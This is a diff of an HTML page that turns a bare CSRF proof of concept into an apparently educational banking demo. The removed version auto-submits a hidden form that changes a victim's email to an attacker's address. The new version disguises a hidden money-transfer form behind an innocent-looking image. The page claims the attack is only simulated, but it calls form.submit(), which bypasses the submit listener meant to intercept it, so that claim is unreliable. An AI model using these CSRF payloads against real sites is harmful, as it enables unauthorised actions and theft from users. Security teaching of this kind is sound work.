@@ -1,19 +1,279 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CSRF PoC</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>CSRF Banking Demo</title>
+
+<style>
+    :root{
+        --bg:#eef3f8;
+        --card:#ffffff;
+        --muted:#6b7280;
+        --accent:#0b63d8;
+        --box-border:#d4e0f0;
+        --success:#16a34a;
+    }
+    body{
+        font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+        background:var(--bg);
+        margin:0;padding:36px;
+        color:#0f172a;
+    }
+
+    .container{ max-width:1100px; margin:0 auto; }
+
+    header h1{
+        font-size:26px;
+        margin:0 0 18px 0;
+    }
+
+    .grid{
+        display:grid;
+        grid-template-columns: 360px 1fr;
+        gap:28px;
+        align-items:start;
+    }
+
+    .card{
+        background:var(--card);
+        border-radius:10px;
+        box-shadow: 0 6px 18px rgba(12,38,63,0.06);
+        padding:18px;
+    }
+
+    .balance{
+        background:#e9f2ff;
+        color:#08306b;
+        padding:12px;
+        border-radius:8px;
+        display:inline-block;
+        margin-bottom:14px;
+    }
+
+    .send-form label{ font-size:13px; color:var(--muted); display:block; margin-bottom:6px;}
+    .send-form input[type="text"], .send-form input[type="number"]{
+        width:100%; padding:8px 10px; border-radius:6px; border:1px solid #d6dde7; margin-bottom:12px;
+        box-sizing:border-box;
+    }
+    .send-form button{
+        background:var(--accent); color:white; border:none; padding:8px 14px; border-radius:6px; cursor:pointer;
+    }
+
+    .transactions{
+        border:2px solid var(--box-border);
+        border-radius:8px;
+        padding:16px;
+        min-height:110px;
+        background:linear-gradient(180deg, #fff, #fbfdff);
+    }
+
+    .tx-item{ padding:8px 10px; border-radius:6px; margin-bottom:8px; background:#fbfbfb; border:1px solid #eef3f6; display:flex; justify-content:space-between; align-items:center;}
+    .tx-amt{ font-weight:600; color:var(--success); }
+
+    hr.div{ border:none; border-top:1px solid #ddd; margin:36px 0; opacity:.5; }
+
+    .poc-area{ text-align:center; padding:18px; }
+    .poc-area h3{ margin-bottom:6px; font-size:16px; }
+    .poc-area p{ color:var(--muted); margin:0 0 12px 0; font-size:13px; }
+
+    .poc-image{ display:inline-block; cursor:pointer; border-radius:8px; overflow:hidden; box-shadow:0 8px 18px rgba(18,50,90,0.08); }
+    .poc-image img{ width:180px; height:120px; object-fit:cover; display:block; }
+
+    .footer-note{ font-size:12px; color:var(--muted); margin-top:12px; }
+
+    /* Responsive */
+    @media (max-width:880px){
+        .grid{ grid-template-columns: 1fr; }
+        .container{ padding:0 14px; }
+    }
+</style>
 </head>
 <body>
-    <h1>CSRF Proof of Concept</h1>
-    <p>This is a demonstration of how a CSRF attack could be crafted.</p>
+<div class="container">
+    <header>
+        <h1>Banking Application <small style="color:var(--muted); font-weight:500"> (Vulnerable to CSRF)</small></h1>
+    </header>
 
-    <form action="http://your-target-app.com/update-profile" method="POST" id="csrfForm">
-        <input type="hidden" name="email" value="attacker@example.com">
-    </form>
+    <div class="grid">
+        <!-- left column: balance + form -->
+        <div>
+            <div class="card" style="margin-bottom:18px;">
+                <div class="balance">Your Balance: <strong id="balanceVal">1000</strong> 🪙</div>
 
-    <script>
-        // Auto-submit (used only for PoC demonstration on authorized systems)
-        document.getElementById("csrfForm").submit();
-    </script>
+                <div style="margin-top:12px;">
+                    <h3 style="margin:0 0 10px 0;">Send Money</h3>
+
+                    <!-- VULNERABLE FORM (no csrf token) -->
+                    <form id="sendForm" class="send-form card" action="/transfer" method="POST" style="margin:0; padding:14px;">
+                        <label>Recipient ID:</label>
+                        <input type="text" name="recipient" id="recipient" placeholder="Enter Account ID" required>
+
+                        <label>Amount:</label>
+                        <input type="number" name="amount" id="amount" placeholder="Enter Amount" min="1" required>
+
+                        <button type="submit">Send</button>
+                    </form>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3 style="margin:0 0 10px 0;">Transactions</h3>
+                <div class="transactions" id="transactionsBox">
+                    <div style="color:var(--muted)">No transactions yet.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- right column: explanation or empty to match screenshot spacing -->
+        <div>
+            <div style="height:100%; display:flex; align-items:flex-start; justify-content:center;">
+                <div style="width:100%; max-width:520px;">
+
+                    <div style="padding:18px;">
+                        <h3 style="margin-top:0;">About this demo</h3>
+                        <p style="color:var(--muted); margin-bottom:6px;">
+                            This page demonstrates a vulnerable transfer form that <strong>does not</strong> include a CSRF token.
+                            The suspicious image below acts as an attacker-controlled page that triggers a transfer when clicked.
+                        </p>
+
+                        <ul style="color:var(--muted); padding-left:18px;">
+                            <li>Form method: <strong>POST</strong></li>
+                            <li>No CSRF token present in the form</li>
+                            <li>Image click = attacker triggering the POST (simulated)</li>
+                        </ul>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <hr class="div">
+
+    <div class="poc-area card">
+        <h3>Suspicious Image (CSRF PoC)</h3>
+        <p><span style="color:orange;">⚠️</span> Clicking this innocent-looking image will secretly transfer money to the attacker (demo only).</p>
+
+        <!-- PoC image: clicking this will submit a hidden form (simulated transfer) -->
+        <div class="poc-image" id="pocClick" title="Click to trigger secret transfer">
+            <img src="https://images.unsplash.com/photo-1598887142487-17c4d4b7e9f4?q=80&w=600&auto=format&fit=crop&ixlib=rb-4.0.3&s=1f5a0f04fbb2e4a65a8407a6becf8c1b" alt="PoC image">
+        </div>
+
+        <div class="footer-note">This PoC runs locally and only simulates the transfer — it does not contact any external server.</div>
+    </div>
+</div>
+
+<script>
+/*
+  Demo behaviour:
+  - The visible form (#sendForm) is the "vulnerable" form (no CSRF token).
+  - We intercept both the visible form and the hidden PoC submission and simulate a transfer
+    by updating the transactions list and balance on the page.
+  - The PoC image click submits a hidden form programmatically to simulate an attack.
+*/
+
+// keep balance in a number variable
+let balance = 1000;
+
+// utilities to update UI
+function updateBalanceUI(){ document.getElementById('balanceVal').textContent = balance; }
+function addTransaction(recipient, amount, actor='You'){
+    const box = document.getElementById('transactionsBox');
+
+    // remove "no transactions yet" placeholder if present
+    if (box.querySelector('.tx-item') === null){
+        box.innerHTML = '';
+    }
+
+    const div = document.createElement('div');
+    div.className = 'tx-item';
+    div.innerHTML = `<div>
+                        <div style="font-weight:600">${actor} → ${recipient}</div>
+                        <div style="font-size:12px; color:var(--muted)">Transfer</div>
+                     </div>
+                     <div class="tx-amt">- ${amount}</div>`;
+    box.prepend(div);
+}
+
+// central transfer handling (simulated)
+function handleTransfer(recipient, amount, actor='You'){
+    amount = Number(amount);
+    if (!recipient || !amount || amount <= 0){
+        alert("Invalid transfer data.");
+        return;
+    }
+    if (amount > balance){
+        alert("Insufficient balance (demo).");
+        return;
+    }
+    balance -= amount;
+    updateBalanceUI();
+    addTransaction(recipient, amount, actor);
+}
+
+// intercept visible form submit (normal user action)
+document.getElementById('sendForm').addEventListener('submit', function(e){
+    e.preventDefault(); // prevent real navigation
+    const recipient = document.getElementById('recipient').value.trim();
+    const amount = document.getElementById('amount').value;
+    handleTransfer(recipient, amount, 'You (manual)');
+    // clear inputs
+    document.getElementById('recipient').value = '';
+    document.getElementById('amount').value = '';
+});
+
+// build a "hidden attacker form" that the image will submit.
+// This represents the attacker-controlled page sending a request to the vulnerable site.
+function createHiddenPoCForm(){
+    const f = document.createElement('form');
+    f.style.display = 'none';
+    f.setAttribute('method', 'POST');
+    // IMPORTANT: action would normally point to the vulnerable site's endpoint.
+    // For demo, we won't actually navigate — we'll intercept the submission.
+    f.setAttribute('action', '/transfer');
+
+    const r = document.createElement('input');
+    r.type = 'hidden';
+    r.name = 'recipient';
+    r.value = 'attacker_account_777';
+
+    const a = document.createElement('input');
+    a.type = 'hidden';
+    a.name = 'amount';
+    a.value = '250';
+
+    f.appendChild(r);
+    f.appendChild(a);
+
+    document.body.appendChild(f);
+    return f;
+}
+
+const pocForm = createHiddenPoCForm();
+
+// intercept submission of the PoC form: simulate transfer rather than performing network
+pocForm.addEventListener('submit', function(e){
+    e.preventDefault();
+    // read values
+    const recipient = pocForm.querySelector('[name=recipient]').value;
+    const amount = pocForm.querySelector('[name=amount]').value;
+    handleTransfer(recipient, amount, 'Attacker (CSRF)');
+});
+
+// clicking the image triggers the hidden form submit (attacker trigger)
+document.getElementById('pocClick').addEventListener('click', function(e){
+    // In a real CSRF attack, the attacker-hosted page would cause the victim's browser
+    // to issue a request to the vulnerable site. Here we simulate the result.
+    pocForm.submit();
+    // show a subtle flash to indicate action (for demo clarity)
+    const el = this;
+    el.style.transform = 'scale(0.995)';
+    setTimeout(()=> el.style.transform = '', 120);
+});
+
+/* init */
+updateBalanceUI();
+</script>
 </body>
 </html>
